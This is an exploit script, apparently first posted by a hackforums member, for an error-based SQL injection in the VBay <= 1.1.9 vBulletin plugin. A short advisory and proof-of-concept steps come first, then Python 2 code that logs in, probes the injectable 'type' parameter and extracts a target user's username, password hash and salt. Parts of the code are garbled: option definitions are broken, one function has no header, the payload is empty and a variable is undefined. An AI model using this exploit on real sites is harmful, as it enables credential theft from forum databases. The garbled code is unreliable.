  
"""
  
   VBay <= 1.1.9 - Remote Error based SQL Injection
    
                        ~ Author:  Dan UK
                        ~ Contact: http://www.hackforums.net/member.php?action=profile&uid=817599
                        ~ Date:    10/11/12
          
           DETAILS
           Among a couple of other unsanitized parameters used within an INSERT INTO statement
           on line 424-460 of /upload/vbay.php, the "type" variable can be used to exploit this
           using error based sql injection, making it possible to grab anything the user wants
           from the vbulletin database (and any others if accessible).
    
           As said above, the affected file is /upload/vbay.php.
           On line 418, we can see the $vbulletin->input variable "type"
           being assigned with the datatype NO_HTML. Using this data type
           allows malicious attacks to still be executed.
    
           At line 448, it is used within the insert into statement,
           without any sanitization.
    
          
           POC
           - You will need to register an account.
           - Go to [site]/vbay.php?do=postauction.
           - Modify your post data using a tool such as live http headers, or setting it directly
             using a tool such as curl/wget to grab the source.
           - Set the value of "type=" to something that will cause an error, such as a single tick.
             Example: POST type=&#039;
           - If, when you view the source, you get a vbulletin error message surrounded within
             comments, then it&#039;s possible to go ahead. If not, blind is the way forward.
    
           If error based is possible for you, you could either just simply look at some tutorials
           and go from there, or run the script below which will grab the details for the user specified.
    
           Have fun.
  
"""
  
from optparse import OptionParser, OptionGroup
from argparse import OPTIONAL
import cookielib, urllib, urllib2, httplib
import sys, md5, urlparse, re
  
"""
OPTION PARSER/USAGE
"""
usage = "./%prog [options]\n"
usage += "-h or --help for more help."
  
# Required options
parser = OptionParser(usage=usage)
parser.add_option("-u", dest="username",
                  help="Working username to the target forum.")
parser.add_option("-p", dest="password",
                  help="Working password to the target forum.")
parser.add_option("--host", dest="forumpath",
                  help="FULL path to the vbulletin forum.")
  
# Optional Options
optional = OptionGroup(parser, "Optional arguments")
optional.add_option("-f", dest="userid",
                    help="User ID to grab. Default is 1.", metavar="USERID",
                    default="1")
                         Default is null.", default="")
                    action="store_true")
  
parser.add_option_group(optional)
  
(options, args) = parser.parse_args()
  
if not options.forumpath:
    parser.error(&#039;[-] No forum path given.&#039;)
if not options.username:
    parser.error(&#039;[-] No username given.&#039;)
if not options.password:
    parser.error(&#039;[-] No password given.&#039;)
  
  
"""
HEADER
"""
def Header():
    header = """
# # # # # # # # # # # # # # # # # #
# VBay <=1.1.9 SQL Injection 0day #
#            By Dan_UK            #
# # # # # # # # # # # # # # # # # #\n"""
    return header
  
"""
LOGIN AND EXTRACT NEEDED COOKIES
"""
def loginForum(forum, username, password):
    md5pass = md5.md5(password).hexdigest()
    postdata = urllib.urlencode({
                &#039;do&#039;:&#039;login&#039;,
                &#039;vb_login_md5password&#039;:md5pass,
                &#039;vb_login_username&#039;:username,
                &#039;cookieuser&#039;:&#039;1&#039;
               })
    cookie_jar = cookielib.CookieJar()
    handeler = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar))
    handeler.open(forum + "login.php?do=login", postdata)
    
    for cookie in cookie_jar:
        if "bbsessionhash" in str(cookie):
            return cookie_jar
  
  
"""
CHECK VBAY EXISTS
"""
def get_server_status_code(forum):
    host, path = urlparse.urlparse(forum)[1:3]
    try:
        conn = httplib.HTTPConnection(host)
        conn.request(&#039;HEAD&#039;, path)
        return conn.getresponse().status
    except StandardError:
        return None
  
def checkExists(forum):
    good_codes = [httplib.OK, httplib.FOUND, httplib.MOVED_PERMANENTLY]
    return get_server_status_code(forum + "vbay.php") in good_codes
  
"""
CHECK DEBUG MODE ENABLED
"""
def checkVuln(forum, cookie_jar):
    payload = {
               "POST":
                      urllib.urlencode({"type":"&#039;"}),
               "SCRIPT":"vbay.php?do=postauction"
              }
    try:
        handeler = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar))
        resp = handeler.open(forum + payload["SCRIPT"], payload["POST"])
    except urllib2.HTTPError as e:
        e_mesg = e.read()
        
    if "MySQL Error" in e_mesg:
        return True
  
"""
GRAB PREFIX
"""
def grabPrefix(forum, cookie_jar):
    payload = {
               "SQL":urllib.urlencode({"type":"&#039;"}),
               "SCRIPT":"vbay.php?do=postauction"
              }
    
    try:
        handler = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar))
        resp = handler.open(forum + payload["SCRIPT"], payload["SQL"])
    except urllib2.HTTPError as e:
        e_mesg = e.read()
    
        
    
  
"""
GRAB INFO
"""
    # 0x2564656c696d312125 = "%delim1!%"
    payload = {
                "SQL":
                      urllib.urlencode({
                      }),
               "COLS": ["username", "password", "salt"],
               "SCRIPT":"vbay.php?do=postauction"
              }
    
    info = []
    for col in payload["COLS"]:
        print "[!] Grabbing the %s" % col
        try:
            handler = urllib2.build_opener(urllib2.HTTPCookieProcessor(cookie_jar))
            resp = handler.open(forum + payload["SCRIPT"], payload["SQL"].replace("COL_NAME", col))
        except urllib2.HTTPError as e:
            e_mesg = e.read()
            info.append(e_mesg.split("%delim1!%")[1].strip("\n"))
    return info
    
    
"""
MAIN
"""
def main():
     username = options.username
     password = options.password
     forum = options.forumpath
     userid = options.userid
      
     if forum.lower()[:7] != "http://":
         if forum.lower()[:8] == "https://":
             forum = forum.replace("https://", "http://")
     if forum[-1:] != "/":
         forum = forum + "/"
              
     print Header()
      
     print "[!] Trying to login to: " + forum
     if loginForum(forum, username, password):
         cookies = loginForum(forum, username, password)
         print "[+] Login works."
     else:
         print "[-] Login doesn&#039;t work. (" + username + ":" + password + ")"
         print "[-] Exiting."
         sys.exit()
          
     print "\n[!] Checking if vBay is installed.."
     if (checkExists(forum)):
         print "[+] vBay was found. Continuing with exploit."
     else:
         print "[-] vBay could no be found. (" + forum + "/vbay.php)"
         print "[-] Exiting."
         sys.exit()
          
     print "\n[!] Checking if debug mode is enabled.."
     if checkVuln(forum, cookies):
         print "[+] Debug mode is enabled, exploit is possible."
          
         print "[+] Prefix found:" + grabPrefix(forum, cookies)   
         sys.exit()
          
          
     print "\n[!] Grabbing info.\n"
     print "\n[+] Formatting for ease of view."
     print "\n\n[+] Username: " + info[0]
     print "[+] Password: " + info[1]
     print "[+] Salt: " + info[2]
     print "\n\nThanks for using my tool."
          
      
if __name__ == "__main__":
    main()

